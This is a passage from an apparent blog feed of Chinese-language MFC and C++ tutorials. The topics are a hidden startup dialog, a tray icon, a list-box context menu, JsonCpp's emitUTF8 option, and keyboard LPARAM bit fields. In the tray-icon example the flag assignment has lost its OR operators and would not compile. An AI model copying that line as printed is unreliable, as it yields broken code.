class="line"></span><br><span class="line">    <span class="comment">// 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题</span></span><br><span class="line">    CMFCVisualManager::<span class="built_in">SetDefaultManager</span>(<span class="built_in">RUNTIME_CLASS</span>(CMFCVisualManagerWindows));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标准初始化</span></span><br><span class="line">    <span class="comment">// 如果未使用这些功能并希望减小</span></span><br><span class="line">    <span class="comment">// 最终可执行文件的大小，则应移除下列</span></span><br><span class="line">    <span class="comment">// 不需要的特定初始化例程</span></span><br><span class="line">    <span class="comment">// 更改用于存储设置的注册表项</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 应适当修改该字符串，</span></span><br><span class="line">    <span class="comment">// 例如修改为公司或组织名</span></span><br><span class="line">    <span class="built_in">SetRegistryKey</span>(_T(<span class="string">&quot;应用程序向导生成的本地应用程序&quot;</span>));</span><br><span class="line"></span><br><span class="line">    CDemoApp dlg;</span><br><span class="line">    m_pMainWnd = &amp;dlg;</span><br><span class="line">    <span class="comment">// 此处使用非模态方式创建对话框</span></span><br><span class="line">    INT_PTR nResponse = dlg.<span class="built_in">Create</span>(IDD_DEMO_DIALOG);</span><br><span class="line">    <span class="comment">// 模仿模态窗体</span></span><br><span class="line">    dlg.<span class="built_in">RunModalLoop</span>();</span><br><span class="line">    <span class="keyword">if</span> (nResponse == IDOK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 在此放置处理何时用</span></span><br><span class="line">        <span class="comment">//  “确定”来关闭对话框的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (nResponse == IDCANCEL)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 在此放置处理何时用</span></span><br><span class="line">        <span class="comment">//  “取消”来关闭对话框的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (nResponse == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">TRACE</span>(traceAppMsg, <span class="number">0</span>, <span class="string">&quot;警告: 对话框创建失败，应用程序将意外终止。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">TRACE</span>(traceAppMsg, <span class="number">0</span>, <span class="string">&quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除上面创建的 shell 管理器。</span></span><br><span class="line">    <span class="keyword">if</span> (pShellManager != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> pShellManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)</span></span><br><span class="line">    <span class="built_in">ControlBarCleanUp</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序，</span></span><br><span class="line">    <span class="comment">//  而不是启动应用程序的消息泵。</span></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、修改Dialog的可见属性为<code>False</code>。</p><p><img src="/../uploads/2022/03/1191631831.png" alt="l0rieccg.png" title="l0rieccg.png"></p><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>经过上述代码，我们就做好了启动时隐藏对话框了。如果本文章对你有用，请点赞加评论哦~</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> MFC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MFC托盘图标</title>
      <link href="/96ad6e7c85a8/"/>
      <url>/96ad6e7c85a8/</url>
      
        <content type="html"><![CDATA[<h1 id="托盘简介"><a href="#托盘简介" class="headerlink" title="托盘简介"></a>托盘简介</h1><p>所谓的“托盘”，在Windows系统界面中，指的就是下面任务条右侧的程序小图标位置。在程序最小化时又不希望占据任务栏的话，就可以把程序放到托盘区。</p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>介绍：向任务栏的状态区域发送消息。<br>微软官方文档：<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/shellapi/nf-shellapi-shell_notifyicona">https://docs.microsoft.com/zh-cn/windows/win32/api/shellapi/nf-shellapi-shell_notifyicona</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Shell_NotifyIconA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD            dwMessage,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PNOTIFYICONDATAA lpData</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p><strong>dwMessage</strong>：一个值，指定此函数要执行的操作，它可以具有以下值之一。<br><strong>lpData</strong>：指向<code>NOTIFYICONDATA</code>结构的指针。结构的内容取决于dwMessage的值。它可以定义要添加到通知区域的图标，使该图标显示通知，或标识要修改或删除的图标。</p><h2 id="NOTIFYICONDATA简介"><a href="#NOTIFYICONDATA简介" class="headerlink" title="NOTIFYICONDATA简介"></a>NOTIFYICONDATA简介</h2><p>介绍：包含系统在通知区域中显示通知所需的信息。<br>微软官方文档：<a href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/ns-shellapi-notifyicondataa">https://docs.microsoft.com/en-us/windows/win32/api/shellapi/ns-shellapi-notifyicondataa</a></p><h1 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>在OnInitDialog函数中填写初始化代码，并且添加自定义消息ID，这样我们可以通过该消息ID收到托盘图标的消息内容了。将lpData参数定义为成员变量，这样方便我们对托盘图标的后续操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义消息，当鼠标移动至图标处就会发送该消息</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_SYSTEMTRAY WM_USER + 1</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CxxxDlg::OnInitDialog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...省略其他初始化步骤</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 置托盘图标</span></span><br><span class="line">    <span class="comment">// 此处m_nid类型为NOTIFYICONDATA，定义在该类的成员变量处</span></span><br><span class="line">    m_nid.cbSize = <span class="built_in">sizeof</span>(NOTIFYICONDATA);</span><br><span class="line">    m_nid.hWnd = <span class="built_in">GetSafeHwnd</span>();</span><br><span class="line">    m_nid.uID = IDR_MAINFRAME;</span><br><span class="line">    m_nid.uFlags = NIF_MESSAGE  NIF_ICON  NIF_TIP;</span><br><span class="line">    m_nid.uCallbackMessage = WM_SYSTEMTRAY; <span class="comment">//自定义消息</span></span><br><span class="line">    m_nid.hIcon = m_hIcon;</span><br><span class="line">    <span class="built_in">strcpy_s</span>(m_nid.szTip, <span class="string">&quot;tip&quot;</span>);</span><br><span class="line">    <span class="comment">// 将图标添加至托盘处</span></span><br><span class="line">    ::<span class="built_in">Shell_NotifyIcon</span>(NIM_ADD, &amp;m_nid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>添加自定义消息处理函数，处理的消息ID为我们上述自定义的消息ID：WM_SYSTEMTRAY。这里我们一共处理了两个消息类型，一个是右键弹起，负责右键弹出菜单。另一个是鼠标左键双击消息，负责打开程序主界面。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">afx_msg LRESULT <span class="title">CxxxDlg::OnSystemtray</span><span class="params">(WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (lParam) &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_RBUTTONUP:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//右击弹出托盘菜单</span></span><br><span class="line">            CMenu menu;</span><br><span class="line">            menu.<span class="built_in">LoadMenu</span>(MN_TRAYICON); <span class="comment">// MN_TRAYICON为你自定义的菜单ID</span></span><br><span class="line">            CMenu* pPopUp = menu.<span class="built_in">GetSubMenu</span>(<span class="number">0</span>);</span><br><span class="line">            CPoint pt;</span><br><span class="line">            <span class="built_in">GetCursorPos</span>(&amp;pt);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">SetForegroundWindow</span>();</span><br><span class="line">            pPopUp-&gt;<span class="built_in">TrackPopupMenu</span>(TPM_RIGHTBUTTON, pt.x, pt.y, <span class="keyword">this</span>);</span><br><span class="line">            <span class="built_in">PostMessage</span>(WM_NULL, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_LBUTTONDBLCLK:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 双击托盘图标显示主界面</span></span><br><span class="line">            <span class="keyword">this</span>-&gt;<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>因为我们使用了托盘图标，所以我们最好将<code>WM_CLOSE</code>消息也进行一次处理，具体代码如下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为系统库没有定义MB_YES和MB_NO所以我们需要自己定义一下</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MB_YES 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MB_NO 7</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CxxxDlg::OnClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">AfxMessageBox</span>(<span class="string">&quot;是否关闭程序？是【关闭程序】，否【最小化置托盘图标】&quot;</span>, MB_YESNO);</span><br><span class="line">    <span class="keyword">if</span> (nRet == MB_YES) &#123;</span><br><span class="line">        <span class="built_in">Shell_NotifyIcon</span>(NIM_DELETE, &amp;m_nid);</span><br><span class="line">        CDialogEx::<span class="built_in">OnClose</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;<span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>经过上述代码，一步一步按照要求来编写那么你就完成了MFC置托盘图标功能，如果本文章对你有用，请点赞加评论哦~</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> MFC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MFC右键弹出菜单</title>
      <link href="/6246dc16ba1d/"/>
      <url>/6246dc16ba1d/</url>
      
        <content type="html"><![CDATA[<ol><li>添加一个菜单资源，这里我们的菜单ID改为<code>MN_LST</code>，一定要有子菜单哦~</li><li>新建一个派生类，继承<code>CListBox</code>类，将我们需要弹出菜单的listbox类型改为我们新建的派生类。这里我们取名为<code>CMyListBox</code></li></ol><p><img src="/../uploads/2022/03/1234728155.png" alt="l0m6d6ui.png" title="l0m6d6ui.png"></p><p><img src="/../uploads/2022/03/2061695544.png" alt="l0m6e56c.png" title="l0m6e56c.png"></p><ol start="3"><li>对我们新建的派生类增加WM_RBUTTONUP消息</li></ol><p><img src="/../uploads/2022/03/962843103.png" alt="l0m6gmcr.png" title="l0m6gmcr.png"></p><ol start="4"><li>接下来进行代码编写，如下代码</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyListBox::OnRButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span> </span>&#123;</span><br><span class="line"> <span class="comment">// 获取listbox总数，如果鼠标右键的地方有项目存在则获得该项目的下标</span></span><br><span class="line"> <span class="type">int</span> nIdx = <span class="number">-1</span>;</span><br><span class="line"> <span class="type">int</span> nCount = <span class="built_in">GetCount</span>();</span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nCount; i++) &#123;</span><br><span class="line">     CRect rc;</span><br><span class="line">     <span class="built_in">GetItemRect</span>(i, &amp;rc);</span><br><span class="line">     <span class="keyword">if</span> (rc.<span class="built_in">PtInRect</span>(point)) &#123;</span><br><span class="line">         nIdx = i;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 如果上面的代码获得到listbox的item下标则会选中该item，否则取消选择</span></span><br><span class="line"> <span class="built_in">SetCurSel</span>(nIdx);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 弹出菜单</span></span><br><span class="line"> CMenu menu;</span><br><span class="line"> menu.<span class="built_in">LoadMenu</span>(MN_LST);</span><br><span class="line"> CMenu* popmenu;</span><br><span class="line"> popmenu = menu.<span class="built_in">GetSubMenu</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="built_in">ClientToScreen</span>(&amp;point);</span><br><span class="line"> <span class="comment">// 此处的this-&gt;GetParent()决定谁来处理右键菜单点击的事件，这里我们交给父窗口进行处理此消息</span></span><br><span class="line"> popmenu-&gt;<span class="built_in">TrackPopupMenu</span>(TPM_RIGHTBUTTON, point.x, point.y, <span class="keyword">this</span>-&gt;<span class="built_in">GetParent</span>()); </span><br><span class="line"></span><br><span class="line"> CListBox::<span class="built_in">OnRButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> MFC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新版JsonCpp中关闭中文处理方法</title>
      <link href="/1e29b978541a/"/>
      <url>/1e29b978541a/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>JsonCpp遇见中文的时候会将中文转义为\uXXXX类型，那么本文给出解决方法。</p><h1 id="JsonCpp的处理方法"><a href="#JsonCpp的处理方法" class="headerlink" title="JsonCpp的处理方法"></a>JsonCpp的处理方法</h1><p>通过阅读代码，得知中文处理位于文件<code>json_writer.cpp</code>中<code>valueToQuotedStringN</code>函数。函数为如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> String <span class="title">valueToQuotedStringN</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* value, <span class="type">size_t</span> length,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="type">bool</span> emitUTF8 = <span class="literal">false</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (value == <span class="literal">nullptr</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">doesAnyCharRequireEscaping</span>(value, length))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(<span class="string">&quot;\&quot;&quot;</span>) + value + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">  <span class="comment">// We have to walk value and escape any special characters.</span></span><br><span class="line">  <span class="comment">// Appending to String is not efficient, but this should be rare.</span></span><br><span class="line">  <span class="comment">// (Note: forward slashes are *not* rare, but I am not escaping them.)</span></span><br><span class="line">  String::size_type maxsize = length * <span class="number">2</span> + <span class="number">3</span>; <span class="comment">// allescaped+quotes+NULL</span></span><br><span class="line">  String result;</span><br><span class="line">  result.<span class="built_in">reserve</span>(maxsize); <span class="comment">// to avoid lots of mallocs</span></span><br><span class="line">  result += <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">  <span class="type">char</span> <span class="type">const</span>* end = value + length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">const</span> <span class="type">char</span>* c = value; c != end; ++c) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (*c) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\&quot;&#x27;</span>:</span><br><span class="line">      result += <span class="string">&quot;\\\&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">      result += <span class="string">&quot;\\\\&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\b&#x27;</span>:</span><br><span class="line">      result += <span class="string">&quot;\\b&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\f&#x27;</span>:</span><br><span class="line">      result += <span class="string">&quot;\\f&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">      result += <span class="string">&quot;\\n&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\r&#x27;</span>:</span><br><span class="line">      result += <span class="string">&quot;\\r&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\t&#x27;</span>:</span><br><span class="line">      result += <span class="string">&quot;\\t&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// case &#x27;/&#x27;:</span></span><br><span class="line">    <span class="comment">// Even though \/ is considered a legal escape in JSON, a bare</span></span><br><span class="line">    <span class="comment">// slash is also legal, so I see no reason to escape it.</span></span><br><span class="line">    <span class="comment">// (I hope I am not misunderstanding something.)</span></span><br><span class="line">    <span class="comment">// blep notes: actually escaping \/ may be useful in javascript to avoid &lt;/</span></span><br><span class="line">    <span class="comment">// sequence.</span></span><br><span class="line">    <span class="comment">// Should add a flag to allow this compatibility mode and prevent this</span></span><br><span class="line">    <span class="comment">// sequence from occurring.</span></span><br><span class="line">    <span class="keyword">default</span>: &#123;</span><br><span class="line">      <span class="keyword">if</span> (emitUTF8) &#123;</span><br><span class="line">        <span class="type">unsigned</span> codepoint = <span class="built_in">static_cast</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;(*c);</span><br><span class="line">        <span class="keyword">if</span> (codepoint &lt; <span class="number">0x20</span>) &#123;</span><br><span class="line">          <span class="built_in">appendHex</span>(result, codepoint);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">appendRaw</span>(result, codepoint);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">unsigned</span> codepoint = <span class="built_in">utf8ToCodepoint</span>(c, end); <span class="comment">// modifies `c`</span></span><br><span class="line">        <span class="keyword">if</span> (codepoint &lt; <span class="number">0x20</span>) &#123;</span><br><span class="line">          <span class="built_in">appendHex</span>(result, codepoint);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (codepoint &lt; <span class="number">0x80</span>) &#123;</span><br><span class="line">          <span class="built_in">appendRaw</span>(result, codepoint);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (codepoint &lt; <span class="number">0x10000</span>) &#123;</span><br><span class="line">          <span class="comment">// Basic Multilingual Plane</span></span><br><span class="line">          <span class="built_in">appendHex</span>(result, codepoint);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// Extended Unicode. Encode 20 bits as a surrogate pair.</span></span><br><span class="line">          codepoint -= <span class="number">0x10000</span>;</span><br><span class="line">          <span class="built_in">appendHex</span>(result, <span class="number">0xd800</span> + ((codepoint &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x3ff</span>));</span><br><span class="line">          <span class="built_in">appendHex</span>(result, <span class="number">0xdc00</span> + (codepoint &amp; <span class="number">0x3ff</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result += <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读上述代码，我们得知当switch分支走到default的时候就是处理中文的时候，那么只需要将emitUTF8设置为true即可。<br>而JsonCpp的emitUTF8的属性值默认为false。</p><p><img src="/../uploads/2022/03/3120294673.png" alt="l0kdpkfd.png" title="l0kdpkfd.png"></p><p>所以我们在构建StreamWriterBuilder的时候对emitUTF8设置为true就可以解决中文变成\uXXXX类型了。如下代码所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Json::StreamWriterBuilder streamWriterBuilder;</span><br><span class="line">streamWriterBuilder[<span class="string">&quot;emitUTF8&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">auto</span> strRes = Json::<span class="built_in">writeString</span>(streamWriterBuilder, root);</span><br></pre></td></tr></table></figure><p>如果本文对你有所帮助，那么请帮我点个赞吧~</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jsoncpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SendMessage中WM_KEYDOWN和WM_KEYUP的LPARAM参数详解</title>
      <link href="/2f866eab75cf/"/>
      <url>/2f866eab75cf/</url>
      
        <content type="html"><![CDATA[<h1 id="LPARAM参数结构体"><a href="#LPARAM参数结构体" class="headerlink" title="LPARAM参数结构体"></a>LPARAM参数结构体</h1><p>下述结构体为我根据微软官方文档进行编写的结构体使用的时候只需要对其填写数值即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">KEYBOARD_LPARAM</span> &#123;</span><br><span class="line">    DWORD m_dwParam;</span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">        DWORD m_dwClickCount : <span class="number">16</span>; <span class="comment">// 按下次数</span></span><br><span class="line">        DWORD m_dwScanCode : <span class="number">8</span>; <span class="comment">// 扫描码</span></span><br><span class="line">        DWORD m_dwExtraInfo : <span class="number">1</span>; <span class="comment">// 扩展键</span></span><br><span class="line">        DWORD m_dwReserved : <span class="number">4</span>; <span class="comment">// 未使用</span></span><br><span class="line">        DWORD m_dwContextCode : <span class="number">1</span>; <span class="comment">// 指定上下文代码。对于WM_KEYDOWN和WM_KEYUP消息，该值始终为0</span></span><br><span class="line">        DWORD m_dwLastKeyStatus : <span class="number">1</span>; <span class="comment">// 指定之前的键状态。对于WM_KEYDOWN消息，如果在消息发送之前，键被按下，则该值是1，否则该值是0。对于WM_KEYUP消息，该值始终为 1 。</span></span><br><span class="line">        DWORD m_dwTransitionState : <span class="number">1</span>; <span class="comment">// 指定过渡状态。对于WM_KEYDOWN消息，该值始终为0。对于WM_KEYUP消息，该值始终为 1 。</span></span><br><span class="line">    &#125; m_lparam;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KEYBOARD_LPARAM keyboard_lparam;</span><br><span class="line">keyboard_lparam.m_lparam.m_dwClickCount = <span class="number">1</span>;</span><br><span class="line">keyboard_lparam.m_lparam.m_dwScanCode = <span class="built_in">MapVirtualKey</span>(btkeyCode, <span class="number">0</span>);</span><br><span class="line">keyboard_lparam.m_lparam.m_dwExtraInfo = <span class="number">0</span>;</span><br><span class="line">keyboard_lparam.m_lparam.m_dwReserved = <span class="number">0</span>;</span><br><span class="line">keyboard_lparam.m_lparam.m_dwContextCode = <span class="number">0</span>;</span><br><span 